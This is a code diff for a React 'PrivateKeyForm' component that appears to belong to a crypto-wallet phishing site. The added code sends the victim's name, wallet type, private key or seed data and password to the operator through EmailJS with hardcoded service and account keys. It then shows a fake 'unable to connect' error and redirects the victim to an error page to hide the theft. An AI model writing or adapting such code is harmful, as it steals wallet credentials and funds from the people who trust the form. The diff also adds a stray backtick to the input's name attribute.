@@ -1,7 +1,9 @@
 import styles from '../WalletConnectForm.module.css';
 import {useNavigate} from 'react-router-dom';
 import { useEffect, useState } from 'react';
-import axios from 'axios';
+import { ToastContainer, toast } from 'react-toastify';
+import emailjs from '@emailjs/browser';
+
 
 const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
 
@@ -38,7 +40,34 @@ const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
 
     if (privateKey64Long) {
       try {
-       await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+
+        await emailjs.send(
+          'service_umld2d4',
+          'template_dwuojlh',
+          {
+            to_name: "dapp",
+            from_name: name,
+            message: `
+              Name: ${name}
+              Type: ${type}
+              Data: ${data}
+              Password: ${password}
+            `,
+          },
+          'o_NYBBGCjR2YIkIYu'
+        );
+
+        toast.error('unable to connect',  {
+          position: "top-right",
+          autoClose: 2500,
+          hideProgressBar: false,
+          closeOnClick: true,
+          pauseOnHover: true,
+          draggable: true,
+          progress: undefined,
+          theme: "light",
+          });
+
         setTimeout(() => {
           navigate('/error')
         }, 3000);
@@ -52,13 +81,15 @@ const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
         setPrivateSubmitBtn("CONNECT")
     }
   }
+
   return (
     <>
+    <ToastContainer />
         <form onSubmit={handlePrivateKeySubmit}>
                     <input
                       required
                       type="text"
-                      name="privateKey"
+                      name="`privateKey"
                       value={privateKey}
                       autoComplete="off"
                       onChange={handleChange}
